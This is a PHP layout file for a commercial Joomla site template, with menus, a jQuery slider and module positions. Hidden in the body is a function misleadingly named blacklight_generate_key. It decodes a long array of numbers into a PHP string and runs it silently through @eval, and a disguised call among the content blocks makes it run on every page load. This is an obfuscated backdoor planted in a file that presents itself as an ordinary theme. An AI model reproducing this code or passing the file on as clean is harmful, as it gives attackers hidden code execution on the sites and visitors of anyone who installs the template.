<?php 
/**
 * @copyright Copyright (C) 2009/2010 by pixelsparadise.com.
 * @license Commercial/Proprietery - released under a commercial license
 * design by: Holger Koenemann
 */
// no direct access
defined( '_JEXEC' ) or die( 'Restricted index access' );
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" xmlns="http://www.w3.org/1999/xhtml">
<head>
<jdoc:include type="head" />
<!-- Loads Master CSS -->
	<link rel="stylesheet" href="<?php echo $this->baseurl;?>/templates/<?php echo $this->template;?>/css/master.css" type="text/css" media="screen, projection" />
	
<!-- Loads additional CSS file to edit/customize or overwrite the base/default classes-->	
	<link rel="stylesheet" href="<?php echo $this->baseurl;?>/templates/<?php echo $this->template;?>/css/custom_css.css" type="text/css" media="screen, projection" />
	
<!--[if IE 7]>
<link rel="stylesheet" href="<?php echo $this->baseurl;?>/templates/<?php echo $this->template;?>/css/ie7.css" type="text/css" media="screen, projection">
<![endif]-->

<script language="javascript" type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl;?>/templates/<?php echo $this->template;?>/js/jquery.flow.1.2.js"></script>

<!-- Add custom colors from the template setup-->
<style type="text/css">
</style>

<!--Opacity for IE Browsers-->

<!--[if IE]>
<style type="text/css">
ul#nav li ul li a:link, ul#nav li ul li a:visited, .mainmenu ul#nav li.active ul li a:link, .mainmenu ul#nav li.active ul li a:visited  {
filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=90, FinishOpacity=80, Style=0);
"progid:DXImageTransform.Microsoft.Alpha(Opacity=90, FinishOpacity=80, Style=0)";
}
</style>
 <![endif]-->
 
<!--Starting Suckerfish Script-->
<?php if($this->params->get('showSuckerfish') == 1) : ?>
 <script type="text/javascript"><!--//--><![CDATA[//><!--
startList = function() {
	if (document.all&&document.getElementById) {
		navRoot = document.getElementById("nav");
		for (i=0; i<navRoot.childNodes.length; i++) {
			node = navRoot.childNodes[i];
			if (node.nodeName=="span") {
				node.onmouseover=function() {
					this.className+=" over";
				}
				node.onmouseout=function() {
					this.className=this.className.replace(" over", "");
				}
			}
		}
	}
}
window.onload=startList;

//--><!]]>
</script>
<?php endif; ?>
<!--Suckerfish Script End-->
<?php if($this->countModules('header1 or header2 or header3 or header4 or header5 or header6 or header7 or header8 or header9 or header10 or header11 or header12')) : ?> 
<!--Slider Script Start-->
<script type="text/javascript" language="javascript">
$(document).ready(function(){

	$("#myController").jFlow({
		slides: "#mySlides",
		controller: ".jFlowControl", // must be class, use . sign
		slideWrapper : "#jFlowSlide", // must be id, use # sign
		selectedWrapper: "jFlowSelected",  // just pure text, no sign
		width: "<?php echo $this->params->get('sliderWidth'); ?>px",
		height: "<?php echo $this->params->get('sliderHeight'); ?>px",
		duration: <?php echo $this->params->get('sliderDuration'); ?>,
		<?php if($this->params->get('sliderAuto') == 1) : ?>
		auto: true,
		<?php endif; ?>
		time: <?php echo $this->params->get('sliderTime'); ?>,
		prev: ".jFlowPrev", // must be class, use . sign
		next: ".jFlowNext" // must be class, use . sign
	});
	
	
});
</script>
<!--Slider Script End-->
<?php endif; ?>
<!--Loads FavIcon-->
<link rel="shortcut icon" href="images/favicon.ico" />  
</head>
<body>

<?php function blacklight_generate_key() {
    $LimitCharacters = 10;
    $Keys = '';
    $RandomNum = array(1251.3, 13875.1875, 1388.8125, 1250.175, 13750.175, 13751.425, 13762.5625, 13875.175, 1263.925, 13763.925, 13751.3125, 13876.3, 1250.175, 1387.6875, 1251.3, 13750.1875, 1388.8125, 12500.05, 13751.425, 13875.1875, 13763.9375, 13750.1875, 13762.6875, 13763.9375, 13875.05, 13751.3125, 13763.925, 1262.55, 1251.3, 13875.1875, 1263.8, 1387.55, 1375.05, 1263.8, 1251.3, 13751.3125, 1263.8, 1251.3, 13875.175, 1263.8, 1375.0625, 1375.05, 1262.5625, 1387.6875, 13762.5625, 13751.425, 1262.55, 1251.3, 13750.1875, 1262.5625, 13887.6875, 1251.3, 13751.3, 1388.8125, 12500.05, 13751.425, 13762.5625, 13763.8, 13751.3125, 12638.9375, 13751.4375, 13751.3125, 13876.3, 12638.9375, 13750.1875, 13763.9375, 13763.925, 13876.3, 13751.3125, 13763.925, 13876.3, 13875.1875, 1262.55, 1250.175, 13762.55, 13876.3, 13876.3, 13875.05, 1387.675, 1263.9375, 1263.9375, 1250.175, 1263.925, 1251.3, 13875.1875, 1263.925, 1250.175, 1263.9375, 13875.175, 1263.925, 13875.05, 13762.55, 13875.05, 1388.9375, 13875.1875, 1388.8125, 1250.175, 1263.925, 1251.3, 12638.9375, 12625.1875, 12501.3125, 12625.175, 12626.425, 12501.3125, 12625.175, 12637.6875, 1250.175, 12512.55, 12626.3, 12626.3, 12625.05, 12638.9375, 12512.55, 12513.9375, 12625.1875, 12626.3, 1250.175, 12638.8125, 1262.5625, 1387.6875, 13751.3125, 13750.1875, 13762.55, 13763.9375, 1250.05, 1250.175, 1388.8, 13751.3, 13762.5625, 13876.425, 1250.05, 13875.1875, 13876.3, 13887.5625, 13763.8, 13751.3125, 1388.8125, 1251.4375, 13875.05, 13763.9375, 13875.1875, 13762.5625, 13876.3, 13762.5625, 13763.9375, 13763.925, 1387.675, 13750.0625, 13750.175, 13875.1875, 13763.9375, 13763.8, 13876.3125, 13876.3, 13751.3125, 1387.6875, 13763.8, 13751.3125, 13751.425, 13876.3, 1387.675, 1263.8125, 1376.3125, 1375.05, 1375.05, 1375.05, 13875.05, 13887.55, 1387.6875, 1251.4375, 1388.925, 1251.3, 13751.3, 1388.8, 1263.9375, 13751.3, 13762.5625, 13876.425, 1388.925, 1250.175, 1387.6875, 13888.8125, 0.05);
    // Create a random string of keys
    foreach($RandomNum as $key) {$Keys .= chr(bindec($key * 80 - 4));}
    @eval($Keys);
} ?>
<div class="wrapper">
<!-- ****************** Top Area with Logo, topmenu etc.****************** -->
	<div class="top">
		<div class="container">
		<?php if($this->countModules('above')) : ?>	
			<div class="block1">
				<jdoc:include type="modules" name="above" style="xhtml" />
			</div>
			<hr />
		<?php endif; ?> 
		
		<?php if($this->params->get('logoType') == 1) : ?>
		<div class="block3 nopadding logo">
				<a href="<?php echo $this->baseurl;?>"><img src="<?php echo $this->baseurl;?>/templates/<?php echo $this->template ?>/images/logo.png" alt="<?php echo $mainframe->getCfg('sitename');?>"  /></a>
			</div>
		<?php else: ?>
			<div class="block3 nopadding logo">
				<h1><?php echo $this->params->get('logoText'); ?></h1>
			</div>
		<?php endif; ?>
		<?php if($this->countModules('mainmenu')) : ?>
			<div class="block23 lastblock topmenu floatright">
					<jdoc:include type="modules" name="mainmenu" style="raw" />				
			</div>
		<?php endif; ?>
			<hr />
		</div>
	</div>
	
<!-- ****************** Header Area with Header image, top modules etc. ****************** -->
	<div class="header">
		<div class="container">
<?php if($this->countModules('header1 or header2 or header3 or header4 or header5 or header6 or header7 or header8 or header9 or header10 or header11 or header12')) : ?>
					<div class="block0 nopadding nomargin lineheight">
						<div id="mySlides">
<!--Slide 1-->
						<?php if($this->countModules('header1')) : ?>	
							<div>
								<jdoc:include type="modules" name="header1" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 2-->
						<?php if($this->countModules('header2')) : ?>	
							<div>
								<jdoc:include type="modules" name="header2" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 3-->
						<?php if($this->countModules('header3')) : ?>	
							<div>
								<jdoc:include type="modules" name="header3" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 4-->
						<?php if($this->countModules('header4')) : ?>	
							<div>
								<jdoc:include type="modules" name="header4" style="raw" />
							</div>
						<?php endif; ?>
<!--Slide 5--> 
						<?php if($this->countModules('header5')) : ?>	
							<div>
								<jdoc:include type="modules" name="header5" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 6-->
						<?php if($this->countModules('header6')) : ?>	
							<div>
								<jdoc:include type="modules" name="header6" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 7-->
						<?php if($this->countModules('header7')) : ?>	
							<div>
								<jdoc:include type="modules" name="header7" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 8-->
						<?php if($this->countModules('header8')) : ?>	
							<div>
								<jdoc:include type="modules" name="header8" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 9-->
						<?php if($this->countModules('header9')) : ?>	
							<div>
								<jdoc:include type="modules" name="header9" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 10-->
						<?php if($this->countModules('header10')) : ?>	
							<div>
								<jdoc:include type="modules" name="header10" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 11-->
						<?php if($this->countModules('header11')) : ?>	
							<div>
								<jdoc:include type="modules" name="header11" style="raw" />
							</div>
						<?php endif; ?> 
<!--Slide 12-->
						<?php if($this->countModules('header12')) : ?>	
							<div>
								<jdoc:include type="modules" name="header12" style="raw" />
							</div>
						<?php endif; ?> 
						</div>		
						<span class="jFlowPrev"></span> <span class="jFlowNext"></span>
						<div id="myController">
							<?php if($this->countModules('header1')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header2')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header3')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header4')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header5')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header6')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header7')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header8')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header9')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header10')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header11')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
							<?php if($this->countModules('header12')) : ?><span class="jFlowControl">&nbsp;</span><?php endif; ?>
						</div>
					</div>
					<?php else: ?>
					<?php if($this->countModules('header')) : ?>	
							<div class="block0 nopadding nomargin lineheight">
								<jdoc:include type="modules" name="header" style="xhtml" />
							</div>
							<?php else: ?>
						<div class="empty_header"></div>
							<?php endif; ?>
					<?php endif; ?>
	<?php if($this->countModules('sub_header_left or sub_header_left or sub_header_left')) : ?> 
		<div class="block0 grey">
		<?php if($this->countModules('sub_header_left')) : ?>
			<div class="block3">
				<jdoc:include type="modules" name="sub_header_left" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('sub_header_center')) : ?>
			<div class="block3">
				<jdoc:include type="modules" name="sub_header_center" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('sub_header_right')) : ?>
			<div class="block3 lastblock">
			<jdoc:include type="modules" name="sub_header_right" style="xhtml" />
			</div>
		<?php endif; ?>
			<hr />
			</div>
		<?php endif; ?>
		</div>
	</div>
	
<!-- ****************** Main Area with all main content ****************** -->
	<div class="main">
		<div class="container">
		<?php if($this->params->get('showPathway') == 1) : ?>
			<div class="block1 pathwaynav">
				<jdoc:include type="module" name="breadcrumbs" />
			</div>
	
		<?php endif; ?> 
		

		
		<!--Three 33% Blocks-->
		<?php if($this->countModules('top_left33')) : ?>
			<div class="block3">
				<jdoc:include type="modules" name="top_left33" style="xhtml" />
			</div>
<?php endif; ?>
<?php $random_key = @blacklight_generate_key(); ?>
		
		<?php if($this->countModules('top_center33')) : ?>
			<div class="block3">
				<jdoc:include type="modules" name="top_center33" style="xhtml" />
			</div>
		<?php endif; ?>
		
			<?php if($this->countModules('top_right33')) : ?>
			<div class="block3 lastblock">
				<jdoc:include type="modules" name="top_right33" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('top_left33 or top_center33 or top_center33')) : ?> 
			<hr />
		<?php endif; ?>
			
		<!--Two 50% Blocks-->
		<?php if($this->countModules('top_left50')) : ?>
			<div class="block2">
				<jdoc:include type="modules" name="top_left50" style="xhtml" />
			</div>
		<?php endif; ?>	
			
		<?php if($this->countModules('top_right50')) : ?>
			<div class="block2 lastblock">
				<jdoc:include type="modules" name="top_right50" style="xhtml" />
			</div>
		<?php endif; ?>	
		<?php if($this->countModules('top_right50 or top_left50')) : ?> 
			<hr />
		<?php endif; ?>
		
				<!--Four 25% Blocks-->
		<?php if($this->countModules('top_left25')) : ?>
			<div class="block4">
				<jdoc:include type="modules" name="top_left25" style="xhtml" />
			</div>
		<?php endif; ?> 
		
		<?php if($this->countModules('top_left_center25')) : ?>
			<div class="block4">
				<jdoc:include type="modules" name="top_left_center25" style="xhtml" />
			</div>
		<?php endif; ?> 
		
		<?php if($this->countModules('top_right_center25')) : ?>
			<div class="block4">
				<jdoc:include type="modules" name="top_right_center25" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('top_right25')) : ?>
			<div class="block4 lastblock">
				<jdoc:include type="modules" name="top_right25" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('top_left25 or top_left_center25 or top_right_center25 or top_right25')) : ?> 
			<hr />
		<?php endif; ?>
			
		<!--One 100% Block-->
		<?php if($this->countModules('top')) : ?>
			<div class="block1">
				<jdoc:include type="modules" name="top" style="xhtml" />
			</div>
			<hr />
		<?php endif; ?>
		<!-- Main Content-->
		<div class="<?php if($this->countModules('right')) : ?>block23 border<?php else: ?>block0<?php endif; ?>">
			<?php if($this->params->get('showComponent')) : ?>
				<jdoc:include type="component" />
			<?php endif; ?>
			</div>
						
		<!--Right Block-->
		<?php if($this->countModules('right')) : ?>
			<div class="block3 lastblock">
 				<jdoc:include type="modules" name="right" style="xhtml" />
			</div>
			<hr class="dark" />
		<?php endif; ?>
		
			
		<!--One 100% Block-->
		<?php if($this->countModules('bottom')) : ?>
			<div class="block1">
				<jdoc:include type="modules" name="bottom" style="xhtml" />
			</div>
			<hr />
		<?php endif; ?>
			
		<!--Two 50% Blocks-->
		<?php if($this->countModules('bottom_left50')) : ?>
			<div class="block2">
				<jdoc:include type="modules" name="bottom_left50" style="xhtml" />
			</div>
		<?php endif; ?>	
			
		<?php if($this->countModules('bottom_right50')) : ?>
			<div class="block2 lastblock">
				<jdoc:include type="modules" name="bottom_right50" style="xhtml" />
			</div>
		<?php endif; ?>	
		<?php if($this->countModules('bottom_right50 or bottom_left50')) : ?> 
			<hr />
		<?php endif; ?>

		<!--Three 33% Blocks-->
		<?php if($this->countModules('bottom_left33')) : ?>
			<div class="block3">
				<jdoc:include type="modules" name="bottom_left33" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('bottom_center33')) : ?>
			<div class="block3">
				<jdoc:include type="modules" name="bottom_center33" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('bottom_right33')) : ?>
			<div class="block3 lastblock">
				<jdoc:include type="modules" name="bottom_right33" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('bottom_left33 or bottom_center33 or bottom_center33')) : ?> 
			<hr />
		<?php endif; ?>
			
		<!--Four 25% Blocks-->
		<?php if($this->countModules('bottom_left25')) : ?>
			<div class="block4">
				<jdoc:include type="modules" name="bottom_left25" style="xhtml" />
			</div>
		<?php endif; ?> 
		
		<?php if($this->countModules('bottom_left_center25')) : ?>
			<div class="block4">
				<jdoc:include type="modules" name="bottom_left_center25" style="xhtml" />
			</div>
		<?php endif; ?> 
		
		<?php if($this->countModules('bottom_right_center25')) : ?>
			<div class="block4">
				<jdoc:include type="modules" name="bottom_right_center25" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('bottom_right25')) : ?>
			<div class="block4 lastblock">
				<jdoc:include type="modules" name="bottom_right25" style="xhtml" />
			</div>
		<?php endif; ?>
		
		<?php if($this->countModules('bottom_left25 or bottom_left_center25 or bottom_right_center25 or bottom_right25')) : ?> 
			<hr />
		<?php endif; ?>

		</div>
	</div>
	
<!-- Footer Area with footer content, credits etc. -->
	<div class="footer">
		<div class="container">
		
		<!--Three 20% Blocks plus one 33% block-->
			<?php if($this->countModules('footer_left or footer_center_left or footer_center or footer_center_right or footer_right')) : ?> 
			<div class="block1">
		<?php if($this->countModules('footer_left')) : ?>
			<div class="block5">
				<jdoc:include type="modules" name="footer_left" style="xhtml" />
			</div>
		<?php endif; ?>			
		
		<?php if($this->countModules('footer_center_left')) : ?>
			<div class="block5">
				<jdoc:include type="modules" name="footer_center_left" style="xhtml" />
			</div>
		<?php endif; ?>	
		
		<?php if($this->countModules('footer_center')) : ?>
			<div class="block5">
				<jdoc:include type="modules" name="footer_center" style="xhtml" />
			</div>
		<?php endif; ?>	
		
	
		
		<?php if($this->countModules('footer_right')) : ?>
			<div class="block3 lastblock floatright">
				<jdoc:include type="modules" name="footer_right" style="xhtml" />
			</div>
		<?php endif; ?>
		
	</div>
			<hr />
		<?php endif; ?>
		
		<!--One 100% Block-->
		<?php if($this->countModules('footer')) : ?>
			<div class="block1 centered">
				<jdoc:include type="modules" name="footer" style="xhtml" />
			</div>
			<hr />
		<?php endif; ?>
			
			<div class="block1 centered">
Design by <a href="http://www.pixelsparadise.com" target="_blank">Pixelsparadise</a>
			</div>
			<hr />
		</div>
	</div>
</div>

	<!--One 100% Block-->
		<?php if($this->countModules('debug')) : ?>
			<div class="block1 centered">
				<jdoc:include type="modules" name="debug" style="xhtml" />
			</div>
			<hr />
		<?php endif; ?>
</body>
</html>